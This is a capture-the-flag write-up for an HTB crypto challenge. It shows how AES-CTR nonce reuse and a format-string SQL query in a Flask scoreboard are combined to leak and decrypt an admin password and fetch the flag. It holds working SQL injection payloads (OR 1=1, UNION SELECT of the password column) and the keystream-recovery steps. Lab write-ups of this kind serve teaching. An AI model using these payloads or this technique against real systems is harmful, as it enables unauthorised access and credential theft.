# Impostor (Crypto) Challenge Writeup

## Challenge Overview

The challenge was categorised as **Crypto**, but true to HTB form, it required numerous techniques around the real life implementation of the crypto in order to solve this challenge. 

The challenge presented a web application, and some source code files, themed around typing WPM (Words Per Minute) which were displayed on a scoreboard, by user. 

The intent was to review the source code, identify the weakness or vulnerability in the implementation of the crypto on the website, leak the admin password (presumably through SQLi), and then submit a request to an exposed API endpoint authenticating as admin to receive the flag.

---

# Table of Contents
<details open>
  <summary>📜 Click to Expand/Collapse</summary>

+ [Source Code Review](#source-code-review)
    + [Identifying the Cryptographic Algorithm](#identifying-the-cryptographic-algorithm)
    + [Implementation Weakness](#implementation-weakness)
    + [Revealing the Admin Account](#revealing-the-admin-account)
    + [Identifying the Flag Retrieval Path](#identifying-the-flag-retrieval-path)
    + [Discovering SQL Injection](#discovering-sql-injection)
+ [Plan of Attack](#plan-of-attack)
+ [Registering Attacker Accounts](#registering-attacker-accounts)
+ [Performing SQLi](#performing-sqli)
+ [Leaked Encrypted Password Values](#leaked-encrypted-password-values)
+ [Atacking the Cryptographic Flaw](#atacking-the-cryptographic-flaw)
+ [Decrypting the Administrator Password](#decrypting-the-administrator-password)
+ [Retrieving the Flag](#retrieving-the-flag)
</details>

---

# Challenge Files

The challenge provided the following **relevant** source files:

```text
challenge/
├── app.py
├── views.py
├── database.py
├── utils.py
└── crypto/
    ├── encryptor.py
    └── secret.py
```

## File Responsibilities

| File                  | Purpose                                                |
| --------------------- | ------------------------------------------------------ |
| `crypto/encryptor.py` | AES-CTR encryption implementation                      |
| `crypto/secret.py`    | Generates key and nonce values                         |
| `utils.py`            | Creates users and administrator account                |
| `database.py`         | Database queries and authentication logic              |
| `views.py`            | Flask routes including `/scoreboard` and `/classified` |
| `scoreboard.html`     | Displays SQL query results                             |

---

# Initial Reconnaissance

The running application exposed the following functionality:

* User registration
* Public scoreboard with user search functionality

At first glance there was no obvious cryptographic functionality exposed to the user. Since the challenge category was Crypto, the supplied source code became the primary source of analysis.

---

# Source Code Review

## Identifying the Cryptographic Algorithm

### Reviewing `crypto/encryptor.py`

```python
from Crypto.Cipher import AES
from secret import KEY, IV

def encrypt(s):
    return AES.new(KEY, AES.MODE_CTR, nonce=IV).encrypt(s.encode())
```

**Important observations:**

* The cryptographic algorithim used is AES-CTR mode 
* AES-CTR requires a unique nonce for every encryption performed with a given key
* No authentication tag was used

### Reviewing `crypto/secret.py`

```python
import os

KEY = os.urandom(16)
IV = os.urandom(15)
```

The application generated:

* A random AES key
* A random CTR nonce

**Important observations:**

* No unique nonce was generated for each encryption operation, both values were generated **once at application startup**
* Every encryption operation reused the same `(KEY, nonce)` pair
* This causes all password encryptions to share the same keystream

## Implementation Weakness

The weakness in this implementation is called a CTR keystream reuse vulnerability and can be defined as:

>Reusing a nonce and key pair in Counter (CTR) mode reduces it to an insecure stream cipher. If used twice, the identical keystream is generated. XORing two ciphertexts cancels out the keystream, allowing an attacker to deduce the underlying plaintexts

Therefore, by obtaining one known plaintext password and it's ciphertext, the keystream could be recovered and used to decrypt every other password in the database.

---

## Revealing the Admin Account

### Reviewing `utils.py`

User accounts were pre-populated during application startup, including one called "HTBAdmin":

```python
username = 'HTBAdmin' if i == 7 else f'user_{generate_random_string(6)}'
password = generate_random_string(17)
```

Passwords are encrypted and stored as:

```python
encrypt(password).hex()
```

We now know the follwing about the administrator account:

```text
Username: HTBAdmin
Password: Random 17-character string
Stored: AES-CTR ciphertext
```

---

## Identifying the Flag Retrieval Path

### Reviewing `views.py`

The flag endpoint was:

```python
@bp.route('/classified', methods=['POST'])
def classified():
```

Authentication relied on:

```python
database.is_admin(username, password)
```

If successful:

```python
open("/flag.txt").read()
```

was returned.

This established the objective:

1. Recover the administrator password.
2. Authenticate as HTBAdmin.
3. Retrieve the flag.

---

## Discovering SQL Injection

### Reviewing `database.py`

We can see that the SQL query only returns 4 fields (*id, username, email, wpm*) for display on the scoreboard. This means the users encrypted passwords are not exposed on the scoreboard and must be leaked, in order to retrieve known ciphertext to reveal the keystream.

```python
def select_users_by_username(self, username):
    query = (
        'SELECT id, username, email, wpm '
        'FROM users '
        'WHERE username LIKE "%s" AND is_admin = 0'
    ) % username
```

User input (search term) was inserted directly into the SQL query without sanitisation, meaning this was succeptable to SQLi, and can be exploited to leak the encrypted passwords. 

<p align="center"><img src="preview.png"/><br>
  <em>Verifying the information displayed on the scoreboard</em></p>

---

# Plan of attack

+ Register a user with a known password
+ Use UNION SQL injection to leak encrypted passwords
+ Recover the CTR keystream using known plaintext XOR ciphertext
+ Decrypt the leaked HTBAdmin ciphertext
+ Authenticate to `/classified`
+ Retrieve the flag

---

# Registering Attacker Accounts

**Note:** the HTBAdmin account password is 17 characters long meaning, we need to create a password (known plaintext) that is 17 characters long, to ensure we can retrieve the full keystream with XOR.

New account created:

```text
Username: adminadmin2
Password: AAAAAAAAAAAAAAAAA
```

---

# Performing SQLi

## Verifying SQL Injection

Searching for:

```sql
" OR 1=1 #
```

returned all users, including the normally hidden administrator account.

This confirmed:

* SQL injection existed.
* The `is_admin = 0` filter could be bypassed.

---

## Determining Column Count

A UNION test was performed:

```sql
%" UNION SELECT 1,2,3,4 #
```

The payload executed successfully, confirming:

```text
Column count = 4
```

---

# Extracting Password Ciphertexts

The scoreboard rendered the following fields:
+ ID
+ Username
+ Email
+ WPM

The Email column was replaced with password data using:

```sql
%" UNION SELECT id,username,password,0 FROM users #
```

Result:

```text
ID | Username | Password Ciphertext
```

This exposed the encrypted passwords stored in the database.

<p align="center"><img src="scoreboard.png"/><br>
  <em>Leaking the encrypted passwords on the scoreboard</em></p>

---

# Leaked Encrypted Password Values

**Administrator Ciphertext**

```text
Username: HTBAdmin
Ciphertext: b76e80c4dd3048f7dec750220dd24b6a4d
```

**Attacker Controlled Ciphertext**

```text
Username: adminadmin2
Ciphertext: bb4096b2db2767c7cae8552b7bc67d7365
```

---

# Atacking the Cryptographic Flaw

CTR mode behaves as a stream cipher:

```text
ciphertext = plaintext XOR keystream
```

Therefore:

```text
keystream = ciphertext XOR plaintext
```

Because the same key and nonce were reused for every password, the same keystream was used for every encryption.

Recovering the keystream from one known plaintext immediately compromises all ciphertexts encrypted with the same key and nonce.

## Recovering the CTR Keystream

Known plaintext (Registered user password):

```text
AAAAAAAAAAAAAAAAA
```

Known ciphertext (Registered users encrypted password):

```text
bb4096b2db2767c7cae8552b7bc67d7365
```

Performing:

```text
ciphertext XOR plaintext

bb4096b2db2767c7cae8552b7bc67d7365 XOR AAAAAAAAAAAAAAAAA
```

Recovered keystream:

```text
keystream = fa01d7f39a6626868ba9146a3a873c3224
```

This keystream was used to encrypt **all** passwords in that session, and can be used to decrypt them.

[CyberChef Recipe](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'AAAAAAAAAAAAAAAAA'%7D,'Standard',false)To_Hex('None',0)&input=YmI0MDk2YjJkYjI3NjdjN2NhZTg1NTJiN2JjNjdkNzM2NQ&oeol=FF)

---

# Decrypting the Administrator Password

Administrator ciphertext:

```text
b76e80c4dd3048f7dec750220dd24b6a4d
```

Applying:

```text
plaintext = ciphertext XOR keystream
```

Recovered administrator password:

```text
MoW7GVnqUnDH7UwXi
```

[CyberChef Recipe](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'fa01d7f39a6626868ba9146a3a873c3224'%7D,'Standard',false)&input=Yjc2ZTgwYzRkZDMwNDhmN2RlYzc1MDIyMGRkMjRiNmE0ZA&oeol=FF)

---

# Retrieving the Flag

The `/classified` API endpoint expects:

```json
{
    "username": "HTBAdmin",
    "password": "<password>"
}
```

A simple curl command:


```bash
curl -s \
  -H "Content-Type: application/json" \
  -X POST \
  http://TARGET:1337/classified \
  -d '{"username":"HTBAdmin","password":"MoW7GVnqUnDH7UwXi"}'
```

## Profit

<p align="center"><img src="solve.png"/><br>
  <em>Leaking the encrypted passwords on the scoreboard</em></p>



